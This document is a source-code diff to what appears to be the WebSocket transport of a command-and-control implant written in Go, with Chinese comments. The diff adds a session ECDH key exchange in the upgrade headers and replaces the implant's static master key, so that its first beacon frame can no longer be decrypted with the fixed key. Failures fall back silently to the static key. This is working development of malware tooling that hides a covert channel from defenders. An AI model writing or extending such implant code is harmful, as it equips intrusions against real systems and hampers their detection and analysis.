@@ -3,22 +3,21 @@
 package main
 
 import (
+	"fmt"
 	"implant/core/app"
-	"implant/core/debuglog"
 	"implant/core/communication"
 	"implant/core/config"
+	"implant/core/debuglog"
 	"implant/core/encrypt"
 	"implant/core/reconnect"
-	"net/http"
 	"implant/core/utils"
-	"fmt"
+	"net/http"
 	"strings"
 	"sync"
 	"time"
 
 	"github.com/gorilla/websocket"
 )
-
 
 // NewTransport 构造 websocket 传输（单二进制 build tag 入口）
 // init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
@@ -77,7 +76,15 @@ func (c *WSClient) Connect(url string) error {
 	dialer := websocket.Dialer{
 		HandshakeTimeout: 30 * time.Second,
 	}
-	conn, _, err := dialer.Dial(url, http.Header{"User-Agent": []string{config.UserAgent()}})
+	// 会话前 ECDH 交换（阶段一 1c）：升级请求带客户端公钥，升级响应回服务端公钥。
+	// 必须在生成 MetaInfo **之前** —— MetaInfo 是升级后的第一帧，
+	// 若先加密再交换，那一帧仍会被静态密钥解开，改造只剩表面效果。
+	hdr := http.Header{"User-Agent": []string{config.UserAgent()}}
+	kx, kxErr := encrypt.NewKeyExchange()
+	if kxErr == nil {
+		hdr.Set(encrypt.KxHeaderName, kx.HeaderValue())
+	}
+	conn, resp, err := dialer.Dial(url, hdr)
 	if err != nil {
 		c.fail()
 		return err
@@ -86,6 +93,20 @@ func (c *WSClient) Connect(url string) error {
 	conn.SetReadLimit(64 * 1024 * 1024)
 	c.Client = conn
 	c.connected = true
+
+	// 升级响应里带回服务端公钥 → 派生并替换静态主密钥。
+	// 失败一律静默继续（走静态密钥），与"服务端不支持 ECDH"表现一致。
+	if kxErr == nil && resp != nil {
+		if peerPub, perr := encrypt.ParsePeerPublicKey(resp.Header.Get(encrypt.KxHeaderName)); perr == nil {
+			salt, _ := app.GetListenerKeyConfig(listenerType)
+			if masterKey, derr := kx.DeriveMasterKey(peerPub, salt[:16]); derr == nil {
+				if rerr := encrypt.GlobalClientKeyManager.ReplaceMasterKey(masterKey); rerr == nil {
+					utils.MetaInfo = nil // 旧 MetaInfo 由静态密钥生成，必须重建
+					debuglog.Printf("🔑 [WS-KX] 会话前密钥交换完成，已替换静态主密钥\n")
+				}
+			}
+		}
+	}
 
 	// MetaInfo + FirstBlood
 	if len(utils.MetaInfo) == 0 {
@@ -120,7 +141,7 @@ func (c *WSClient) StartHeartbeat() {
 		close(c.stopCh)
 	}
 	c.stopCh = make(chan struct{})
-stop := c.stopCh
+	stop := c.stopCh
 	go app.HeartbeatLoop(stop, c.keepAlive)
 }
 
